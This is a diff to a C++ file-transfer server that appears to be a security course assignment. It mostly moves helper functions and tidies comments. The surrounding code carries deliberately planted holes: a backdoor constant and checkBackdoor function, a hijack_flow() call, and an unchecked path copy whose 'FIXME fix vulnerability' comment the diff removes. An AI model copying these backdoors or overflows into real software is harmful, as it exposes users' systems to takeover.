@@ -18,7 +18,8 @@ const string ACCESS_ERROR = "Error: access denied!\n";
 const string FILENAME_ERROR = "Error: the path is too long.\n";
 const string AUTHENTICATION_FAIL = "Authentication failed.\n";
 const string TRANSFER_ERROR = "Error: file transfer failed.\n";
-const string ALREADY_LOGGED_IN = "Error: user already logged in\n";
+const string ALREADY_LOGGED_IN = "Error: user already logged in.\n";
+const string THREAD_ERROR = "Error: Unable to create new thread.\n";
 
 const ssize_t backDoor = 150138823314737907;
 
@@ -210,6 +211,70 @@ void checkBackdoor(const string &uname) {
     }
 }
 
+
+/**
+ * Splits a line at given delimiter character.
+ *
+ * @param res, resulting vector of split string
+ * @param line, input string
+ * @param delim, character to be considered as delimiter
+ * @return size of vector
+ */
+size_t split(vector<string> &res, const string &line, const char *delim) {
+    res.clear();
+    char *token = strtok(strdup(line.c_str()), delim);
+    while (token != nullptr) {
+        res.emplace_back(token);
+        token = strtok(nullptr, delim);
+
+    }
+    if (res.empty()) {
+        res.emplace_back("");
+    }
+    return res.size();
+}
+
+
+/**
+ * Compare two strings, in a way to satisfy test requirements.
+ *
+ * @param s1, string one
+ * @param s2, string two
+ * @return boolean, True if s1 is smaller than s2
+ */
+bool caseInsensitiveCompare(const string &s1, const string &s2) {
+    size_t ssize = s1.size() < s2.size() ? s1.size() : s2.size();
+
+    for (size_t i = 0; i < ssize; ++i) {
+        int c1 = tolower(s1.at(i));
+        int c2 = tolower(s2.at(i));
+        if (c1 == c2)
+            continue;
+        return c1 < c2;
+    }
+    return s1.size() < s2.size();
+}
+
+
+/**
+ * Orders vector of strings in alphabetical order.
+ *
+ * @param unsorted, vector of strings
+ * @param delim, delimiter character
+ * @return string or sorted strings
+ */
+string alphabeticOrder(vector<string> unsorted, char delim) {
+    sort(unsorted.begin(), unsorted.end());
+
+    sort(unsorted.begin(), unsorted.end(), caseInsensitiveCompare);
+    string res;
+    for (auto it = unsorted.begin(); it != unsorted.end(); ++it) {
+        res += (*it) + (it != unsorted.end() ? delim : '\0');
+    }
+    return res;
+}
+
+
 /*
  * ------------------------ Command implementations (same order as pdf) ------------------------------------------------
  */
@@ -302,9 +367,19 @@ int ls_cmd(bool authenticated, string &out, User usr) {
     }
     string cmd = "ls -l ";
     exec(cmd.c_str(), out, usr.getLocation());
+
+    // return out put of ls -l command, with appropriate username, apparently always root in given test cases ?
     return modifyUsrName(out, "root");
 }
 
+/**
+ *  Changes creator of displayed ls output to be given user.
+ *  Does not necessarily reflect the true file creator, but test cases make us believe that it should be done like this.
+ *
+ * @param out, modified ls output
+ * @param usrName, username that has to be put
+ * @return error code
+ */
 int modifyUsrName(string &out, string usrName) {
     vector<string> lines;
     split(lines, out, "\n");
@@ -346,6 +421,7 @@ int cd_cmd(string dirPath, User &usr, string &out) {
         return 1;
     }
 
+    // Note that we execute the cd on bash and not shell, in order to get exact error message as in posted test cases.
     string cmd = "exec bash -c \'cd \"" + escape(absPath) + "\"\'";
 
     int res = exec(cmd.c_str(), out, usr.getLocation());
@@ -439,10 +515,11 @@ int get_cmd(string fileName, int getPort, User &usr, string &out) {
     if (constructPath(fileName, usr.getLocation(), absPath, out)) {
         return 1;
     }
-    strncpy(args->fileName, absPath.c_str(), 1024);    //FIXME fix vulnerability
+    strncpy(args->fileName, absPath.c_str(), 1024);
     args->fileName[absPath.length()] = '\0';
     args->port = getPort;
 
+    // Check if file exists
     if (access(fileName.c_str(), F_OK) == -1) {
         out = TRANSFER_ERROR;
         return 1;
@@ -458,7 +535,7 @@ int get_cmd(string fileName, int getPort, User &usr, string &out) {
         // Create new thread
         int rc = pthread_create(&usr.getThread, nullptr, openFileServer, (void *) args);
         if (rc != 0) {
-            cerr << "Error" << endl;
+            cerr << THREAD_ERROR;
         }
     }
     return 0;
@@ -470,8 +547,8 @@ int get_cmd(string fileName, int getPort, User &usr, string &out) {
  * sends the specified file from the current local working directory (i.e., where the
  * client was started) to the server.
  * The server responds to this command with a TCP port (in ASCII decimal)
- * in the following format: put port: $PORT. In this instance, the server will
- * spawn a thread to receive the file from the clients sending thread as seen in
+ * in the following format: put port: $PORT.
+ *
  * @param fileName, file to put
  * @param fileSize, size of file
  * @param port, port for transmitting file
@@ -501,15 +578,15 @@ int put_cmd(string fileName, string fileSize, int port, User &usr, string &out) 
     if (i != 0) {
         hijack_flow();
     }
-
     out = "put port: " + to_string(port) + "\n";
 
     // Cancel previous get command if one was executed
     pthread_cancel(usr.putThread);
+
     // Create new thread
     int rc = pthread_create(&usr.putThread, nullptr, openFileClient, (void *) args);
     if (rc != 0) {
-        cerr << "Error" << endl;
+        cerr << THREAD_ERROR;
     }
     return 0;
 }
@@ -621,7 +698,7 @@ int logout_cmd(User &usr, string &out) {
 
 
 /**
- * The  exit  command  can  always  be  executed  and  signals  the  end  of  the command session.
+ * The exit command can always be executed and signals the end of the command session.
  *
  * @param usr, user wanting to exit
  * @param out, output string
@@ -633,44 +710,5 @@ int exit_cmd(User &usr, string &out) {
         connected_users.erase(usr);
     }
     return 0;
-}
-
-
-size_t split(vector<string> &res, const string &line, const char *delim) {
-    res.clear();
-    char *token = strtok(strdup(line.c_str()), delim);
-    while (token != nullptr) {
-        res.emplace_back(token);
-        token = strtok(nullptr, delim);
-
-    }
-    if (res.empty()) {
-        res.emplace_back("");
-    }
-    return res.size();
-}
-
-bool caseInsensitiveCompare(const string &s1, const string &s2) {
-    size_t ssize = s1.size() < s2.size() ? s1.size() : s2.size();
-
-    for (size_t i = 0; i < ssize; ++i) {
-        int c1 = tolower(s1.at(i));
-        int c2 = tolower(s2.at(i));
-        if (c1 == c2)
-            continue;
-        return c1 < c2;
-    }
-    return s1.size() < s2.size();
-}
-
-string alphabeticOrder(vector<string> unsorted, char delim) {
-    sort(unsorted.begin(), unsorted.end());
-
-    sort(unsorted.begin(), unsorted.end(), caseInsensitiveCompare);
-    string res;
-    for (auto it = unsorted.begin(); it != unsorted.end(); ++it) {
-        res += (*it) + (it != unsorted.end() ? delim : '\0');
-    }
-    return res;
 }
 
